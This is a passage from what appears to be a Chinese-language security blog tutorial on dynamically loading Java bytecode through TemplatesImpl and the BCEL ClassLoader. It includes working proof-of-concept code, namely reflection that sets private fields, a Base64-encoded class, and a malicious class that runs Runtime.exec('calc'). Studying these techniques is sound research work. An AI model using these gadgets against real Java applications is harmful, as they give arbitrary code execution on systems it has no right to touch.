<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;<span class="comment">//这里要求_transletIndex不能小于0</span></span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>此时就需要看下面这部分代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;<span class="comment">//这里要求_transletIndex不能小于0</span></span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>_transletIndex</code>不能小于0，并且在前面可以看到赋值语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_transletIndex = i;</span><br></pre></td></tr></table></figure>

<p>这里刚好与前面的<code>_class[_transletIndex]</code>相对应，也就是可以理解为<strong>只要条件满足，<code>_bytecodes</code>对应的代码都会传给<code>_class[i]</code>，也就是<code>_class[_transletIndex]</code>,然后就会再对这个类进行实例化</strong>，这样就可以成功运行。现在来看给这个赋值的if的条件语句，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">再看</span><br><span class="line">_class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line"><span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br></pre></td></tr></table></figure>

<p>所以这里就需要<code>_bytecodes[i]</code>的父类需要为AbstractTranslet才行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static String ABSTRACT_TRANSLET</span><br><span class="line">        = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br></pre></td></tr></table></figure>

<p>所以使用的POC:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里为什么要多两个transform方法，原因如下;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里是因为子类需要实现父类里面的抽象方法，同时因为父类是抽象类，可能没有将接口的方法全部实现，</span><br><span class="line">这时子类如果不是抽象的，那必须将其他接口方法都实现。</span><br><span class="line">这里面 `transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler)</span><br><span class="line">是父类里面的抽象方法所以要重写</span><br><span class="line">transform(DOM document, SerializationHandler[] handlers)是父类没有实现接口的方法所以要重写</span><br></pre></td></tr></table></figure>

<p>最终的POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTFRlc3Q7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAcACAcAJwwAKAApAQAEY2FsYwwAKgArAQAEVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAgABAAJAA0ACgALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQABEAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAA0ACwAAACAAAwAAAAEADAANAAAAAAABABIAEwABAAAAAQAUABUAAgAOAAAABAABABYAAQAQABcAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABAACwAAACoABAAAAAEADAANAAAAAAABABIAEwABAAAAAQAYABkAAgAAAAEAGgAbAAMADgAAAAQAAQAWAAEAHAAAAAIAHQ==&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        ctf.newTransformer();</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然报错，但是成功弹出计算机：</p>
<p><img src="/2024/06/23/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240621192229726.png" alt="image-20240621192229726"></p>
<p>那么现在我们来尝试一下利用那个<code>public</code>修饰符的方法，即<code>getTransletIndex</code>，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getTransletIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="comment">// Falls through</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _transletIndex;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里也是只需要<code>_class</code>变量为null即可，现在就继续跟<code>defineTransletClasses()</code>，但是这里就有个问题，无法实例化，这也是为什么没有利用到这个的原因。</p>
<p>继续思考，是私有方法，为什么不直接使用反射来获取，因为TemplatesImpl类有一个无参的公共的构造方法，尝试构造一下</p>
<p>弹计算机代码不变，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main.java变为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对象+getClass()</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\\\java_text\\\\java-1\\\\out\\\\production\\\\java-1\\\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ctf.getClass().getDeclaredMethod(<span class="string">&quot;getTransletInstance&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(ctf);<span class="comment">//但是其实在根本上没有变化，都是在getTransletInstance方法这里实例化，没办法，只有这里接收到了defineClass()返回的类，这里才能实例化</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类名+.class也行，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\\\java_text\\\\java-1\\\\out\\\\production\\\\java-1\\\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredMethod(<span class="string">&quot;getTransletInstance&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ctf</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(ctf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是好像forName()不行。</p>
<h2 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h2><p>关于BCEL可以先看看P神的文章：<code>https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html#0x01-bcel</code></p>
<p>在Java 8u251的更新中，这个ClassLoader被移除了，简单了解一下。这里用JDK7看一下</p>
<p>——————————————</p>
<p>BCEL全名是Apache Commoms BCEL，属于Apache Commoms项目下的一个子项目。</p>
<p>BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。它很特殊的点在它被包含在了原生的JDK中，位于<code>com.sun.org.apache.bcel</code>中。</p>
<p>BCEL包中有个有趣的类<code>com.sun.arg.apache.bcel.internal.util.ClassLoader</code>，他是一个ClassLoader，但是他重写了Java内置的<code>ClassLoader#loadClass()</code>方法，去看一下源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">       * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">          cl = deferTo.loadClass(class_name);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);<span class="comment">//这里调用了defineClass方法</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">          cl = Class.forName(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(resolve)</span><br><span class="line">        resolveClass(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>其中调用的是defineClass()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);<span class="comment">//这里调用了defineClass方法</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>看代码，这里就需要需要BCEL字节码的开头为<code>$$BCEL$$</code>，用createClass方法获取类的Class对象从而可以赋值给clazz。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">         clazz = createClass(class_name);</span><br></pre></td></tr></table></figure>

<p>简单梳理一下过程，首先就是设置c1为null</p>
<p><img src="/2024/06/23/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240622014141638.png" alt="image-20240622014141638"></p>
<p>然后在下面这个条件语句判断开头有没有这个东西，如果有，就使用createClass()方法来对象并赋值给clazz，具体实现可以自己去看源代码（在createClass方法内就已经将BCEL形式的字节码转换成JavaClass对象了）</p>
<p><img src="/2024/06/23/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240622014213692.png" alt="image-20240622014213692"></p>
<p>此时clazz不为null，那么就会进入到下面这个语句</p>
<p><img src="/2024/06/23/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240622014429488.png" alt="image-20240622014429488"></p>
<p>这里就会调用到defeineClass()方法了，再在这里面得到类的字节码（个人理解为估计是从JavaClass到Class字节码），最终获得类对象c1并return了回去。</p>
<p>流程已经基本清楚，那么如何利用呢，如下：</p>
<p>在BCEL中，它提供了Utility和Repository类</p>
<p>其中Repository提供了<strong>lookupClass方法</strong>用于加载一个类</p>
<p><img src="/2024/06/23/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240621222719621.png" alt="image-20240621222719621"></p>
<p>Utility类提供了一个<strong>encode方法</strong>用于将JavaClass对象转换成BCEL形式的字节码</p>
<p><img src="/2024/06/23/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240621222915322.png" alt="image-20240621222915322"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(clazz.getBytes(), <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>再用BCEL ClassLoader进行加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();<span class="comment">//这里就是简单的实例化对象后的对一个函数的调用</span></span><br></pre></td></tr></table></figure>

<p>整合一下，我们可以这样利用</p>
<p>编写恶意类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Test.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POC：</p>
